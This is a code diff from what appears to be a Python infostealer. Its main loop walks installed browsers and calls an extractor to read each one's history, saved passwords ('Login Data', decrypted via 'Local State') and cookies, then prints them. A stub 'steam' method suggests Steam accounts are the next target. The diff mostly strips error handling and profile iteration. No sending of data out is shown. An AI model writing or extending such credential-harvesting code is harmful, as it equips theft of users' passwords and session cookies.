@@ -21,36 +21,16 @@ class Main:
 
             profiles = ["Default"]
 
-            try:
-                print("a")
-            
-                for folder in os.listdir(browser):
-                    if folder.startswith("profile".lower):
-                        profiles.append(folder)
-
-                for profile in profiles:
-                    browserExtractor = extractor.Extract(browser+"\\Local State")
-                    history = browserExtractor.extractHistory(browser+f"\\{profile}\\History")
-                    passwd = browserExtractor.extractPasswd(browser+f"\\{profile}\\Login Data")
-                    cookies = browserExtractor.extractCookies(browser+f"\\{profile}")
-            
-            except FileNotFoundError:
-                continue
-
         for browser in extractor.browsers:
-            try:
-                print("a")
 
-                browserExtractor = extractor.Extract(browser+"\\Local State")
-                history = browserExtractor.extractHistory(browser+"\\History")
-                passwd = browserExtractor.extractPasswd(browser+"\\Login Data")
-                cookies = browserExtractor.extractCookies(browser)
+            browserExtractor = extractor.Extract(browser+"\\Local State")
+            history = browserExtractor.extractHistory(browser+"\\History")
+            passwd = browserExtractor.extractPasswd(browser+"\\Login Data")
+            cookies = browserExtractor.extractCookies(browser)
 
-                print(history)
-                print(passwd)
-                print(cookies)
-            except FileNotFoundError:
-                continue
+            print(history)
+            print(passwd)
+            print(cookies)
 
     def steam(self):
         pass
